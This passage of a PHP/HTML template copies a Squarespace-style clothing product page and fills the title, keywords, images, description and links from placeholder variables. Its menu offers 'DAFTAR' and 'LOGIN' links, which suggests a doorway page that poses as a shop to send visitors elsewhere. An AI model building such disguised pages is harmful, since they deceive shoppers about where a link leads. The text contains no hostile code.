                  <a href="<?php echo $CANONICAL ?>" class="cart-style-icon icon--stroke icon--fill icon--cart sqs-custom-cart  header-icon  show-empty-cart-state cart-quantity-zero header-icon-border-shape-none header-icon-border-style-outline">
                    <span class="Cart-inner">




                      <svg class="icon icon--cart" viewBox="0 0 31 24">
                        <g class="svg-icon cart-icon--odd">
                          <circle fill="none" stroke-miterlimit="10" cx="22.5" cy="21.5" r="1" />
                          <circle fill="none" stroke-miterlimit="10" cx="9.5" cy="21.5" r="1" />
                          <path fill="none" stroke-miterlimit="10" d="M0,1.5h5c0.6,0,1.1,0.4,1.1,1l1.7,13
      c0.1,0.5,0.6,1,1.1,1h15c0.5,0,1.2-0.4,1.4-0.9l3.3-8.1c0.2-0.5-0.1-0.9-0.6-0.9H12" />
                        </g>
                      </svg>

                      <div class="icon-cart-quantity">

                        <span class="cart-quantity-container">

                          <span class="sqs-cart-quantity">0</span>

                        </span>

                      </div>
                    </span>
                  </a>
                </div>






              </div>


              <div class="showOnDesktop">
                <div class="header-actions-action header-actions-action--cart">
                  <a href="<?php echo $CANONICAL ?>" class="cart-style-icon icon--stroke icon--fill icon--cart sqs-custom-cart  header-icon  show-empty-cart-state cart-quantity-zero header-icon-border-shape-none header-icon-border-style-outline">
                    <span class="Cart-inner">




                      <svg class="icon icon--cart" viewBox="0 0 31 24">
                        <g class="svg-icon cart-icon--odd">
                          <circle fill="none" stroke-miterlimit="10" cx="22.5" cy="21.5" r="1" />
                          <circle fill="none" stroke-miterlimit="10" cx="9.5" cy="21.5" r="1" />
                          <path fill="none" stroke-miterlimit="10" d="M0,1.5h5c0.6,0,1.1,0.4,1.1,1l1.7,13
      c0.1,0.5,0.6,1,1.1,1h15c0.5,0,1.2-0.4,1.4-0.9l3.3-8.1c0.2-0.5-0.1-0.9-0.6-0.9H12" />
                        </g>
                      </svg>

                      <div class="icon-cart-quantity">

                        <span class="cart-quantity-container">

                          <span class="sqs-cart-quantity">0</span>

                        </span>

                      </div>
                    </span>
                  </a>
                </div>






              </div>


            </div>



          </div>
        </div>
      </div>
      <!-- (Mobile) Menu Navigation -->
      <div class="header-menu header-menu--folder-list
      
      
      
      
      
      " data-section-theme="" data-current-styles="{
    &quot;layout&quot;: &quot;brandingCenter&quot;,
    &quot;action&quot;: {
      &quot;buttonText&quot;: &quot;Get Started&quot;,
      &quot;newWindow&quot;: false
    },
    &quot;showSocial&quot;: true,
    &quot;socialOptions&quot;: {
      &quot;socialBorderShape&quot;: &quot;none&quot;,
      &quot;socialBorderStyle&quot;: &quot;outline&quot;,
      &quot;socialBorderThickness&quot;: {
        &quot;unit&quot;: &quot;px&quot;,
        &quot;value&quot;: 1.0
      }
    },
    &quot;sectionTheme&quot;: &quot;black&quot;,
    &quot;menuOverlayAnimation&quot;: &quot;fade&quot;,
    &quot;cartStyle&quot;: &quot;cart&quot;,
    &quot;cartText&quot;: &quot;Cart&quot;,
    &quot;showEmptyCartState&quot;: true,
    &quot;cartOptions&quot;: {
      &quot;iconType&quot;: &quot;stroke-1&quot;,
      &quot;cartBorderShape&quot;: &quot;none&quot;,
      &quot;cartBorderStyle&quot;: &quot;outline&quot;,
      &quot;cartBorderThickness&quot;: {
        &quot;unit&quot;: &quot;px&quot;,
        &quot;value&quot;: 1.0
      }
    },
    &quot;showButton&quot;: false,
    &quot;showCart&quot;: true,
    &quot;showAccountLogin&quot;: true,
    &quot;headerStyle&quot;: &quot;theme&quot;,
    &quot;languagePicker&quot;: {
      &quot;enabled&quot;: false,
      &quot;iconEnabled&quot;: false,
      &quot;iconType&quot;: &quot;globe&quot;,
      &quot;flagShape&quot;: &quot;shiny&quot;,
      &quot;languageFlags&quot;: [ ]
    },
    &quot;mobileOptions&quot;: {
      &quot;layout&quot;: &quot;logoCenterNavLeft&quot;,
      &quot;menuIcon&quot;: &quot;doubleLineHamburger&quot;,
      &quot;menuIconOptions&quot;: {
        &quot;style&quot;: &quot;doubleLineHamburger&quot;,
        &quot;thickness&quot;: {
          &quot;unit&quot;: &quot;px&quot;,
          &quot;value&quot;: 1.0
        }
      }
    },
    &quot;dynamicOptions&quot;: {
      &quot;border&quot;: {
        &quot;enabled&quot;: false,
        &quot;position&quot;: &quot;allSides&quot;,
        &quot;thickness&quot;: {
          &quot;unit&quot;: &quot;px&quot;,
          &quot;value&quot;: 4.0
        },
        &quot;color&quot;: {
          &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
          &quot;sitePaletteColor&quot;: {
            &quot;colorName&quot;: &quot;black&quot;,
            &quot;alphaModifier&quot;: 1.0
          }
        }
      }
    },
    &quot;solidOptions&quot;: {
      &quot;headerOpacity&quot;: {
        &quot;unit&quot;: &quot;%&quot;,
        &quot;value&quot;: 100.0
      },
      &quot;border&quot;: {
        &quot;enabled&quot;: false,
        &quot;position&quot;: &quot;allSides&quot;,
        &quot;thickness&quot;: {
          &quot;unit&quot;: &quot;px&quot;,
          &quot;value&quot;: 4.0
        },
        &quot;color&quot;: {
          &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
          &quot;sitePaletteColor&quot;: {
            &quot;colorName&quot;: &quot;black&quot;,
            &quot;alphaModifier&quot;: 1.0
          }
        }
      },
      &quot;dropShadow&quot;: {
        &quot;enabled&quot;: false,
        &quot;blur&quot;: {
          &quot;unit&quot;: &quot;px&quot;,
          &quot;value&quot;: 30.0
        },
        &quot;spread&quot;: {
          &quot;unit&quot;: &quot;px&quot;,
          &quot;value&quot;: 0.0
        },
        &quot;distance&quot;: {
          &quot;unit&quot;: &quot;px&quot;,
          &quot;value&quot;: 0.0
        },
        &quot;color&quot;: {
          &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
          &quot;sitePaletteColor&quot;: {
            &quot;colorName&quot;: &quot;black&quot;,
            &quot;alphaModifier&quot;: 1.0
          }
        }
      },
      &quot;blurBackground&quot;: {
        &quot;enabled&quot;: false,
        &quot;blurRadius&quot;: {
          &quot;unit&quot;: &quot;px&quot;,
          &quot;value&quot;: 12.0
        }
      },
      &quot;backgroundColor&quot;: {
        &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
        &quot;sitePaletteColor&quot;: {
          &quot;colorName&quot;: &quot;white&quot;,
          &quot;alphaModifier&quot;: 1.0
        }
      },
      &quot;navigationColor&quot;: {
        &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
        &quot;sitePaletteColor&quot;: {
          &quot;colorName&quot;: &quot;black&quot;,
          &quot;alphaModifier&quot;: 1.0
        }
      }
    },
    &quot;gradientOptions&quot;: {
      &quot;gradientType&quot;: &quot;faded&quot;,
      &quot;headerOpacity&quot;: {
        &quot;unit&quot;: &quot;%&quot;,
        &quot;value&quot;: 90.0
      },
      &quot;border&quot;: {
        &quot;enabled&quot;: false,
        &quot;position&quot;: &quot;allSides&quot;,
        &quot;thickness&quot;: {
          &quot;unit&quot;: &quot;px&quot;,
          &quot;value&quot;: 4.0
        },
        &quot;color&quot;: {
          &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
          &quot;sitePaletteColor&quot;: {
            &quot;colorName&quot;: &quot;black&quot;,
            &quot;alphaModifier&quot;: 1.0
          }
        }
      },
      &quot;dropShadow&quot;: {
        &quot;enabled&quot;: false,
        &quot;blur&quot;: {
          &quot;unit&quot;: &quot;px&quot;,
          &quot;value&quot;: 30.0
        },
        &quot;spread&quot;: {&quot;unit&quot;: &quot;px&quot;,
          &quot;value&quot;: 0.0
        },
        &quot;distance&quot;: {
          &quot;unit&quot;: &quot;px&quot;,
          &quot;value&quot;: 0.0
        },
        &quot;color&quot;: {
          &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
          &quot;sitePaletteColor&quot;: {
            &quot;colorName&quot;: &quot;black&quot;,
            &quot;alphaModifier&quot;: 1.0
          }
        }
      },
      &quot;blurBackground&quot;: {
        &quot;enabled&quot;: false,
        &quot;blurRadius&quot;: {
          &quot;unit&quot;: &quot;px&quot;,
          &quot;value&quot;: 12.0
        }
      },
      &quot;backgroundColor&quot;: {
        &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
        &quot;sitePaletteColor&quot;: {
          &quot;colorName&quot;: &quot;white&quot;,
          &quot;alphaModifier&quot;: 1.0
        }
      },
      &quot;navigationColor&quot;: {
        &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
        &quot;sitePaletteColor&quot;: {
          &quot;colorName&quot;: &quot;black&quot;,
          &quot;alphaModifier&quot;: 1.0
        }
      }
    },
    &quot;dropShadowOptions&quot;: {
      &quot;enabled&quot;: false,
      &quot;blur&quot;: {&quot;unit&quot;: &quot;px&quot;,
        &quot;value&quot;: 12.0
      },
      &quot;spread&quot;: {
        &quot;unit&quot;: &quot;px&quot;,
        &quot;value&quot;: 0.0
      },
      &quot;distance&quot;: {
        &quot;unit&quot;: &quot;px&quot;,
        &quot;value&quot;: 12.0
      }
    },
    &quot;borderOptions&quot;: {
      &quot;enabled&quot;: false,
      &quot;position&quot;: &quot;bottom&quot;,
      &quot;thickness&quot;: {
        &quot;unit&quot;: &quot;px&quot;,
        &quot;value&quot;: 4.0
      }
    },
    &quot;showPromotedElement&quot;: false,
    &quot;buttonVariant&quot;: &quot;primary&quot;,
    &quot;blurBackground&quot;: {
      &quot;enabled&quot;: false,
      &quot;blurRadius&quot;: {
        &quot;unit&quot;: &quot;px&quot;,
        &quot;value&quot;: 12.0
      }
    },
    &quot;headerOpacity&quot;: {
      &quot;unit&quot;: &quot;%&quot;,
      &quot;value&quot;: 100.0
    }
  }" data-section-id="overlay-nav" data-show-account-login="true" data-test="header-menu">
        <div class="header-menu-bg theme-bg--primary"></div>
        <div class="header-menu-nav">
          <nav class="header-menu-nav-list">
            <div data-folder="root" class="header-menu-nav-folder">
              <div class="header-menu-nav-folder-content">
                <!-- Menu Navigation -->
                <div class="header-menu-nav-wrapper">





                  <div class="container header-menu-nav-item header-menu-nav-item--collection">
                    <a href="<?php echo $CANONICAL ?>">
                      <div class="header-menu-nav-item-content">
                        <?php echo $KW ?>
                      </div>
                    </a>
                  </div>







                  <div class="container header-menu-nav-item header-menu-nav-item--collection">
                    <a href="<?php echo $HYPERLINK ?>">
                      <div class="header-menu-nav-item-content">
                        DAFTAR
                      </div>
                    </a>
                  </div>







                  <div class="container header-menu-nav-item header-menu-nav-item--collection header-menu-nav-item--active header-menu-nav-item--homepage">
                    <a href="<?php echo $HYPERLINK ?>" aria-current="page">
                      <div class="header-menu-nav-item-content">
                        LOGIN
                      </div>
                    </a>
                  </div>



                </div>


              </div>

              <div class="header-menu-actions social-accounts">


                <div class="header-menu-actions-action header-menu-actions-action--social mobile">
                  <a class="icon icon--lg icon--fill  header-icon header-icon-border-shape-none header-icon-border-style-outline" href="http://instagram.com" target="_blank" aria-label="Instagram">
                    <svg viewBox="23 23 64 64">
                      <use xlink:href="#instagram-unauth-icon" width="110" height="110"></use>
                    </svg>
                  </a>
                </div>

                <div class="header-menu-actions-action header-menu-actions-action--social mobile">
                  <a class="icon icon--lg icon--fill  header-icon header-icon-border-shape-none header-icon-border-style-outline" href="http://twitter.com" target="_blank" aria-label="Twitter">
                    <svg viewBox="23 23 64 64">
                      <use xlink:href="#twitter-unauth-icon" width="110" height="110"></use>
                    </svg>
                  </a>
                </div>

                <div class="header-menu-actions-action header-menu-actions-action--social mobile">
                  <a class="icon icon--lg icon--fill  header-icon header-icon-border-shape-none header-icon-border-style-outline" href="https://tiktok.com" target="_blank" aria-label="TikTok">
                    <svg viewBox="23 23 64 64">
                      <use xlink:href="#tiktok-unauth-icon" width="110" height="110"></use>
                    </svg>
                  </a>
                </div>

                <div class="header-menu-actions-action header-menu-actions-action--social mobile">
                  <a class="icon icon--lg icon--fill  header-icon header-icon-border-shape-none header-icon-border-style-outline" href="https://facebook.com" target="_blank" aria-label="Facebook">
                    <svg viewBox="23 23 64 64">
                      <use xlink:href="#facebook-unauth-icon" width="110" height="110"></use>
                    </svg>
                  </a>
                </div>

                <div class="header-menu-actions-action header-menu-actions-action--social mobile">
                  <a class="icon icon--lg icon--fill  header-icon header-icon-border-shape-none header-icon-border-style-outline" href="https://youtube.com" target="_blank" aria-label="YouTube">
                    <svg viewBox="23 23 64 64">
                      <use xlink:href="#youtube-unauth-icon" width="110" height="110"></use>
                    </svg>
                  </a>
                </div>


              </div>



            </div>
          </nav>
        </div>
      </div>
    </header>




    <main id="page" class="container" role="main">


      <article class="sections" id="sections" data-page-sections="660d5c677b67070328ef15a1">

        <section data-test="page-section" data-section-theme="light" class='page-section 
    
      content-collection
      full-bleed-section
      collection-type-products
    
    background-width--full-bleed
    
      section-height--medium
    
    
      content-width--wide
    
    horizontal-alignment--center
    vertical-alignment--middle
    
      
    
    
    light' data-section-id="660d5c677b67070328ef15a3" data-controller="SectionWrapperController" data-current-styles="{
    &quot;imageOverlayOpacity&quot;: 0.15,
    &quot;backgroundWidth&quot;: &quot;background-width--full-bleed&quot;,
    &quot;sectionHeight&quot;: &quot;section-height--medium&quot;,
    &quot;customSectionHeight&quot;: 10,
    &quot;horizontalAlignment&quot;: &quot;horizontal-alignment--center&quot;,
    &quot;verticalAlignment&quot;: &quot;vertical-alignment--middle&quot;,
    &quot;contentWidth&quot;: &quot;content-width--wide&quot;,
    &quot;customContentWidth&quot;: 50,
    &quot;sectionTheme&quot;: &quot;light&quot;,
    &quot;sectionAnimation&quot;: &quot;none&quot;,
    &quot;backgroundMode&quot;: &quot;image&quot;
  }" data-current-context="{
    &quot;video&quot;: {
      &quot;playbackSpeed&quot;: 0.5,
      &quot;filter&quot;: 1,
      &quot;filterStrength&quot;: 0,
      &quot;zoom&quot;: 0,
      &quot;videoSourceProvider&quot;: &quot;none&quot;
    },
    &quot;backgroundImageId&quot;: null,
    &quot;backgroundMediaEffect&quot;: null,
    &quot;divider&quot;: null,
    &quot;typeName&quot;: &quot;products&quot;
  }" data-animation="none">
          <div class="section-border">
            <div class="section-background">



            </div>
          </div>
          <div class='content-wrapper' style='
      
      
    '>
            <div class="content">







              <section id="pdp" class="
    products
    collection-content-wrapper
    product-layout-side-by-side
  ">








                <article class="ProductItem hentry author-karen-laurence post-type-store-item" data-item-id="660d5c677b67070328ef1518">

                  <nav class="ProductItem-nav">
                    <div class="ProductItem-nav-breadcrumb" data-animation-role="content">
                      <a href="<?php echo $CANONICAL ?>" class="ProductItem-nav-breadcrumb-link">Shop</a>
                      <span class="ProductItem-nav-breadcrumb-separator"></span>
                      <a href="<?php echo $CANONICAL ?>" class="ProductItem-nav-breadcrumb-link"><?php echo $TITLE ?></a>
                    </div>



                  </nav>


                  <section class="ProductItem-summary" data-controller="ProductGallery">
                    <section aria-label="Gallery" class="ProductItem-gallery" data-product-gallery="container">

                      <div class="ProductItem-gallery-scroll">
                        <div aria-label="Gallery thumbnails" class="ProductItem-gallery-thumbnails" data-animation-role="image" role="group">


                          <button class="ProductItem-gallery-thumbnails-item" aria-label="Image 1 of 2" data-product-gallery="thumbnails-item">
                            <img class="ProductItem-gallery-thumbnails-item-image" data-load="false" data-src="<?php echo $GAMBAR ?>" data-image="<?php echo $GAMBAR ?>" data-image-dimensions="1600x1600" data-image-focal-point="0.5,0.5" alt="<?php echo $KW ?>" elementtiming="nbf-products-gallery-thumbnail" />
                          </button>

                          <button class="ProductItem-gallery-thumbnails-item" aria-label="Image 2 of 2" data-product-gallery="thumbnails-item">
                            <img class="ProductItem-gallery-thumbnails-item-image" data-load="false" data-src="<?php echo $GAMBAR ?>" data-image="<?php echo $GAMBAR ?>" data-image-dimensions="1500x1500" data-image-focal-point="0.5,0.5" alt="lauren-winter-sonia-skirt-grey_DETAIL.jpg" elementtiming="nbf-products-gallery-thumbnail" />
                          </button>

                        </div>
                      </div>


                      <div class="ProductItem-gallery-slides" data-animation-role="image" data-product-gallery="slides">

                        <div class="ProductItem-gallery-carousel-controls enable-on-first-image-load" data-first-img-load>
                          <button class="
              product-item-gallery-carousel-control
              ProductItem-gallery-prev
            " data-product-gallery="prev" aria-label="Previous">
                          </button>
                          <button class="
              product-item-gallery-carousel-control
              ProductItem-gallery-next
            " data-product-gallery="next" aria-label="Next">
                          </button>
                        </div>
                        <div class="ProductItem-gallery-current-slide-indicator enable-on-first-image-load" data-first-img-load data-product-gallery="indicator">
                        </div>



                        <div class="ProductItem-gallery-slides-item" data-slide-index="1" data-image-id=660d5c677b67070328ef151a data-controller="ImageZoom" data-slide-url="bkcco4ek9tctk7jomutrnm31vbhwqr-846s8-z8z36" data-product-gallery="slides-item" data-test="pdp-gallery-slide">
                          <img aria-describedby="ProductItem-gallery-slides-item-1-index-660d5c677b67070328ef151a" class="ProductItem-gallery-slides-item-image" data-load="false" data-src="<?php echo $GAMBAR ?>" data-image="<?php echo $GAMBAR ?>" data-image-dimensions="1600x1600" data-image-focal-point="0.5,0.5" alt="<?php echo $KW ?>" elementtiming="nbf-products-gallery" />
                          <span id="ProductItem-gallery-slides-item-1-index-660d5c677b67070328ef151a" style="display: none;">
                            Image 1 of 2
                          </span>
                          <div class="product-image-zoom-duplicate" aria-hidden="true">
                            <img data-load="false" data-src="<?php echo $GAMBAR ?>" data-image="<?php echo $GAMBAR ?>" data-image-dimensions="1600x1600" data-image-focal-point="0.5,0.5" alt="<?php echo $KW ?>" elementtiming="nbf-products-gallery-zoom" />
                          </div>
                        </div>




                        <div class="ProductItem-gallery-slides-item" data-slide-index="2" data-image-id=660d5c677b67070328ef151d data-controller="ImageZoom" data-slide-url="vw0inh5pzjwbyon1nbz1ahsmvwvu7f-e3r6t-9cmbl" data-product-gallery="slides-item" data-test="pdp-gallery-slide">
                          <img aria-describedby="ProductItem-gallery-slides-item-2-index-660d5c677b67070328ef151d" class="ProductItem-gallery-slides-item-image" data-load="false" data-src="<?php echo $GAMBAR ?>" data-image="<?php echo $GAMBAR ?>" data-image-dimensions="1500x1500" data-image-focal-point="0.5,0.5" alt="lauren-winter-sonia-skirt-grey_DETAIL.jpg" elementtiming="nbf-products-gallery" />
                          <span id="ProductItem-gallery-slides-item-2-index-660d5c677b67070328ef151d" style="display: none;">
                            Image 2 of 2
                          </span>
                          <div class="product-image-zoom-duplicate" aria-hidden="true">
                            <img data-load="false" data-src="<?php echo $GAMBAR ?>" data-image="<?php echo $GAMBAR ?>" data-image-dimensions="1500x1500" data-image-focal-point="0.5,0.5" alt="lauren-winter-sonia-skirt-grey_DETAIL.jpg" elementtiming="nbf-products-gallery-zoom" />
                          </div>
                        </div>



                        <div class="gallery-lightbox-outer-wrapper" data-use-image-loader="true" data-controller="Lightbox">
                          <div class="gallery-lightbox " data-section-theme="">
                            <div class="gallery-lightbox-background"></div>

                            <div class="gallery-lightbox-header">
                              <button class="gallery-lightbox-close-btn" aria-label="Close" data-close data-test="gallery-lightbox-close">
                                <div class="gallery-lightbox-close-btn-icon">
                                  <svg viewBox="0 0 40 40">
                                    <path d="M4.3,35.7L35.7,4.3" />
                                    <path d="M4.3,4.3l31.4,31.4" />
                                  </svg>
                                </div>
                              </button>
                            </div>


                            <div class="gallery-lightbox-wrapper">
                              <div class="gallery-lightbox-list">

                                <figure class="gallery-lightbox-item" data-slide-url="bkcco4ek9tctk7jomutrnm31vbhwqr-846s8-z8z36">
                                  <div class="gallery-lightbox-item-wrapper">
                                    <div class="gallery-lightbox-item-src">
                                      <div class="gallery-lightbox-item-img content-fit">
                                        <img data-src="<?php echo $GAMBAR ?>" data-image="<?php echo $GAMBAR ?>" data-image-dimensions="1600x1600" data-image-focal-point="0.5,0.5" alt="<?php echo $KW ?>" data-load="false" elementtiming="nbf-product-lightbox" />
                                      </div>
                                    </div>
                                  </div>
                                </figure>

                                <figure class="gallery-lightbox-item" data-slide-url="vw0inh5pzjwbyon1nbz1ahsmvwvu7f-e3r6t-9cmbl">
                                  <div class="gallery-lightbox-item-wrapper">
                                    <div class="gallery-lightbox-item-src">
                                      <div class="gallery-lightbox-item-img content-fit">
                                        <img data-src="<?php echo $GAMBAR ?>" data-image="<?php echo $GAMBAR ?>" data-image-dimensions="1500x1500" data-image-focal-point="0.5,0.5" alt="lauren-winter-sonia-skirt-grey_DETAIL.jpg" data-load="false" elementtiming="nbf-product-lightbox" />
                                      </div>
                                    </div>
                                  </div>
                                </figure>

                              </div>

                              <div class="gallery-lightbox-controls" data-test="gallery-lightbox-controls">
                                <div class="gallery-lightbox-control" data-previous data-test="gallery-lightbox-control-previous">
                                  <button class="gallery-lightbox-control-btn" aria-label="Previous Slide">
                                    <div class="gallery-lightbox-control-btn-icon">
                                      <svg class="caret-left-icon--small" viewBox="0 0 9 16">
                                        <polyline fill="none" stroke-miterlimit="10" points="7.3,14.7 2.5,8 7.3,1.2 " />
                                      </svg>
                                    </div>
                                  </button>
                                </div>
                                <div class="gallery-lightbox-control" data-next data-test="gallery-lightbox-control-next">
                                  <button class="gallery-lightbox-control-btn" aria-label="Next Slide">
                                    <div class="gallery-lightbox-control-btn-icon">
                                      <svg class="caret-right-icon--small" viewBox="0 0 9 16">
                                        <polyline fill="none" stroke-miterlimit="10" points="1.6,1.2 6.5,7.9 1.6,14.7 " />
                                      </svg>
                                    </div>
                                  </button>
                                </div>
                              </div>

                            </div>
                          </div>
                        </div>
                      </div>

                    </section>

                    <section class="
    product-details
    ProductItem-details
  " data-test="pdp-details">
                      <h1 class="ProductItem-details-title" data-content-field="title" data-test="pdp-title">
                        <?php echo $TITLE ?>
                      </h1>
                      <div data-controller="ProductItemVariants,ProductCartButton" class="ProductItem-details-checkout">

                        <div class="ProductItem-product-price" data-animation-role="content">


                          <a href="<?php echo $HYPERLINK ?>" target="_blank"><img src="<?php echo $TOMBOL ?>?v=1702184572" alt="<?php echo $KW ?>" width="100%" height="100%"></a>
                          <div class="product-price">
                            IDR 50.00
                          </div>



                          <div data-afterpay="true" data-current-context="{
    &quot;660d5c677b67070328ef1518&quot;: {
      &quot;scarcityEnabled&quot;: false,
      &quot;scarcityShownByDefault&quot;: false,
      &quot;afterPayAvailable&quot;: false,
      &quot;klarnaAvailable&quot;: false,
      &quot;shopperLanguage&quot;: &quot;en&quot;,
      &quot;afterPayMin&quot;: 0,
      &quot;afterPayMax&quot;: 0,
      &quot;klarnaMin&quot;: 0,
      &quot;klarnaMax&quot;: 0,
      &quot;mailingListSignUpEnabled&quot;: false,
      &quot;mailingListOptInByDefault&quot;: false
    }
  }"></div>
                          <div class="pdp-overlay"></div>

                        </div>

                        <div class="ProductItem-details-excerpt" data-content-field="excerpt">
                          <pre><code>DESCRIPTION</code></pre>
                          <p class="" style="white-space:pre-wrap;"><?php echo $DESKRIPSI ?></p>
                          </pre>
                          <div class="product-variants" data-item-id="660d5c677b67070328ef1518" data-variants="[{&quot;attributes&quot;:{&quot;Size&quot;:&quot;0&quot;},&quot;optionValues&quot;:[{&quot;optionName&quot;:&quot;Size&quot;,&quot;value&quot;:&quot;0&quot;}],&quot;id&quot;:&quot;9da774c3-50da-42d2-aa47-ef575ec57ca2&quot;,&quot;sku&quot;:&quot;SQ4362620&quot;,&quot;price&quot;:5000,&quot;salePrice&quot;:0,&quot;priceMoney&quot;:{&quot;currency&quot;:&quot;IDR&quot;,&quot;value&quot;:&quot;50.00&quot;},&quot;salePriceMoney&quot;:{&quot;currency&quot;:&quot;IDR&quot;,&quot;value&quot;:&quot;0.00&quot;},&quot;onSale&quot;:false,&quot;unlimited&quot;:true,&quot;qtyInStock&quot;:0,&quot;width&quot;:0.0,&quot;height&quot;:0.0,&quot;weight&quot;:0.0,&quot;imageIds&quot;:[],&quot;images&quot;:[],&quot;len&quot;:0.0},{&quot;attributes&quot;:{&quot;Size&quot;:&quot;2&quot;},&quot;optionValues&quot;:[{&quot;optionName&quot;:&quot;Size&quot;,&quot;value&quot;:&quot;2&quot;}],&quot;id&quot;:&quot;49f82b66-8f3d-41b8-a26f-af4b6d07b3ec&quot;,&quot;sku&quot;:&quot;SQ0357750&quot;,&quot;price&quot;:5000,&quot;salePrice&quot;:0,&quot;priceMoney&quot;:{&quot;currency&quot;:&quot;IDR&quot;,&quot;value&quot;:&quot;50.00&quot;},&quot;salePriceMoney&quot;:{&quot;currency&quot;:&quot;IDR&quot;,&quot;value&quot;:&quot;0.00&quot;},&quot;onSale&quot;:false,&quot;unlimited&quot;:false,&quot;qtyInStock&quot;:4,&quot;width&quot;:0.0,&quot;height&quot;:0.0,&quot;weight&quot;:0.0,&quot;imageIds&quot;:[],&quot;images&quot;:[],&quot;len&quot;:0.0},{&quot;attributes&quot;:{&quot;Size&quot;:&quot;4&quot;},&quot;optionValues&quot;:[{&quot;optionName&quot;:&quot;Size&quot;,&quot;value&quot;:&quot;4&quot;}],&quot;id&quot;:&quot;bc23cba5-c88b-440d-b7a9-77ecb0ec5f6f&quot;,&quot;sku&quot;:&quot;SQ8501677&quot;,&quot;price&quot;:5000,&quot;salePrice&quot;:0,&quot;priceMoney&quot;:{&quot;currency&quot;:&quot;IDR&quot;,&quot;value&quot;:&quot;50.00&quot;},&quot;salePriceMoney&quot;:{&quot;currency&quot;:&quot;IDR&quot;,&quot;value&quot;:&quot;0.00&quot;},&quot;onSale&quot;:false,&quot;unlimited&quot;:true,&quot;qtyInStock&quot;:0,&quot;width&quot;:0.0,&quot;height&quot;:0.0,&quot;weight&quot;:0.0,&quot;imageIds&quot;:[],&quot;images&quot;:[],&quot;len&quot;:0.0},{&quot;attributes&quot;:{&quot;Size&quot;:&quot;6&quot;},&quot;optionValues&quot;:[{&quot;optionName&quot;:&quot;Size&quot;,&quot;value&quot;:&quot;6&quot;}],&quot;id&quot;:&quot;9a6e7714-1c66-4b24-9abe-4f7a93936941&quot;,&quot;sku&quot;:&quot;SQ4341270&quot;,&quot;price&quot;:5000,&quot;salePrice&quot;:0,&quot;priceMoney&quot;:{&quot;currency&quot;:&quot;IDR&quot;,&quot;value&quot;:&quot;50.00&quot;},&quot;salePriceMoney&quot;:{&quot;currency&quot;:&quot;IDR&quot;,&quot;value&quot;:&quot;0.00&quot;},&quot;onSale&quot;:false,&quot;unlimited&quot;:true,&quot;qtyInStock&quot;:0,&quot;width&quot;:0.0,&quot;height&quot;:0.0,&quot;weight&quot;:0.0,&quot;imageIds&quot;:[],&quot;images&quot;:[],&quot;len&quot;:0.0},{&quot;attributes&quot;:{&quot;Size&quot;:&quot;8&quot;},&quot;optionValues&quot;:[{&quot;optionName&quot;:&quot;Size&quot;,&quot;value&quot;:&quot;8&quot;}],&quot;id&quot;:&quot;54d672c7-8b94-4b18-82eb-8207d3104eab&quot;,&quot;sku&quot;:&quot;SQ3858862&quot;,&quot;price&quot;:5000,&quot;salePrice&quot;:0,&quot;priceMoney&quot;:{&quot;currency&quot;:&quot;IDR&quot;,&quot;value&quot;:&quot;50.00&quot;},&quot;salePriceMoney&quot;:{&quot;currency&quot;:&quot;IDR&quot;,&quot;value&quot;:&quot;0.00&quot;},&quot;onSale&quot;:false,&quot;unlimited&quot;:false,&quot;qtyInStock&quot;:0,&quot;width&quot;:0.0,&quot;height&quot;:0.0,&quot;weight&quot;:0.0,&quot;imageIds&quot;:[],&quot;images&quot;:[],&quot;len&quot;:0.0}]" data-animation-role="content">
                            <div class="variant-option">
                              <div class="variant-option-title">Size: </div>
                              <div class="variant-select-wrapper">
                                <select aria-label="Select Size" data-variant-option-name="Size">
                                  <option value="">Select Size</option>
                                  <option value="0">0</option>
                                  <option value="2">2</option>
                                  <option value="4">4</option>
                                  <option value="6">6</option>
                                  <option value="8">8</option>
                                </select>
                              </div>
                              <div class="variant-radiobtn-wrapper" data-variant-option-name="Size">
                                <input type="radio" class="variant-radiobtn" value="0" name="variant-option-Size" id="variant-option-Size-0" />
                                <label class="sqs-button-element--secondary" role="button" tabindex="0" for="variant-option-Size-0">0</label>
                                <input type="radio" class="variant-radiobtn" value="2" name="variant-option-Size" id="variant-option-Size-2" />
                                <label class="sqs-button-element--secondary" role="button" tabindex="0" for="variant-option-Size-2">2</label>
                                <input type="radio" class="variant-radiobtn" value="4" name="variant-option-Size" id="variant-option-Size-4" />
                                <label class="sqs-button-element--secondary" role="button" tabindex="0" for="variant-option-Size-4">4</label>
                                <input type="radio" class="variant-radiobtn" value="6" name="variant-option-Size" id="variant-option-Size-6" />
                                <label class="sqs-button-element--secondary" role="button" tabindex="0" for="variant-option-Size-6">6</label>
                                <input type="radio" class="variant-radiobtn" value="8" name="variant-option-Size" id="variant-option-Size-8" />
                                <label class="sqs-button-element--secondary" role="button" tabindex="0" for="variant-option-Size-8">8</label>
                              </div>
                            </div>
                          </div>

                          <div class="product-quantity-input" data-item-id="660d5c677b67070328ef1518" data-animation-role="content">
                            <div class="quantity-label">Quantity:</div>
                            <input aria-label="Quantity" size="4" max="9999" min="1" value="1" type="number" step="1"></input>
                          </div>

                          <div class="sqs-add-to-cart-button-wrapper" data-animation-role="button">
                            <div class="sqs-add-to-cart-button sqs-suppress-edit-mode sqs-editable-button sqs-button-element--primary " role="button" tabindex="0" data-dynamic-strings data-collection-id="660d5c677b67070328ef14fa" data-item-id="660d5c677b67070328ef1518" data-product-type="1" data-use-custom-label="false" data-original-label="Add To Cart">
                              <div class="sqs-add-to-cart-button-inner">Add To Cart</div>
                            </div>
                          </div>

                        </div>
                    </section>

                  </section>


                  <section class="ProductItem-additional">
                    <div class="sqs-layout sqs-grid-12 columns-12 empty" data-layout-label="Post Body" data-type="item" id="item-660d5c677b67070328ef1518">
                      <div class="row sqs-row">
                        <div class="col sqs-col-12 span-12"></div>
                      </div>
                    </div>
                  </section>

                </article>



              </section>
            </div>

          </div>
        </section>


      </article>







    </main>
    <script type="text/javascript">
      const firstSection = document.querySelector('.page-section');
      const header = document.querySelector('.header');
      const mobileOverlayNav = document.querySelector('.header-menu');
